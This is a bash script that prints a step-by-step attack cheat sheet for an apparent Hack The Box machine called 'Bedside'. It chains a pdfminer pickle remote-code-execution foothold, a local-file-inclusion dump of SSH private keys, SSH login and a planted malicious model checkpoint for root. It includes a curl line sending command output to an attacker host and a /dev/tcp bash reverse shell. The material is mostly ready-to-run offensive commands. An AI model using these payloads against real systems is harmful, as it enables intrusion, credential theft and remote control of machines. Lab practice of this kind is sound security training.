#!/usr/bin/env bash
# Bedside helper — high-level steps (fill IPs). Does not auto-pwn; prints commands.
set -euo pipefail

TARGET_IP="${TARGET_IP:-CHANGE_ME}"
LHOST="${LHOST:-CHANGE_ME}"
LPORT="${LPORT:-4444}"
DIR="$(cd "$(dirname "$0")" && pwd)"

cat <<EOF
=== Bedside (HTB) — attack chain cheat sheet ===

0) VPN up, hosts:
   echo '${TARGET_IP} bedside.htb research.bedside.htb' | sudo tee -a /etc/hosts

1) FOOTHOLD — pdfminer pickle (listener first if revshell)
   nc -lvnp ${LPORT}
   python3 ${DIR}/pdfminer_rce.py --mode revshell --lhost ${LHOST} --lport ${LPORT} \\
       --upload --target-ip ${TARGET_IP} --name shell1
   # or one-shot plant:
   python3 ${DIR}/pdfminer_rce.py --mode cmd --cmd 'id | curl -d @- http://${LHOST}:8888/' \\
       --upload --target-ip ${TARGET_IP}

2) From container shell (datawrangler), LFI host :3000
   # serve scripts to container or paste lfi_esm.py
   python3 lfi_esm.py --host 172.17.0.1 --dump-keys --out-dir /tmp/keys
   # steal id_rsa → scp out or base64

3) SSH user
   chmod 600 developer_id_rsa
   ssh -i developer_id_rsa developer@${TARGET_IP}

4) ROOT — plant checkpoint (from container / process that can write /datastore)
   # On host (if you can write /datastore as root after first pwn) or from container
   # with torch on host:
   sudo python3 plant_checkpoint.py \\
     --out /datastore/checkpoints/zzz_pwn.pt \\
     --png /datastore/processed/sample.png \\
     --cmd "id > /tmp/from_ckpt; bash -c 'bash -i >& /dev/tcp/${LHOST}/9001 0>&1' &" \\
     --clear-other-pt
   # as developer:
   sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py

Notes:
  - pdf_watcher: SLEEP 30s, TIMEOUT 10s; background payloads.
  - Encoding: PDF Name /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2F<name>
  - LFI needs raw path with ../  (urllib normalizes)
  - /datastore not writable as developer — container datawrangler is the plant path
EOF
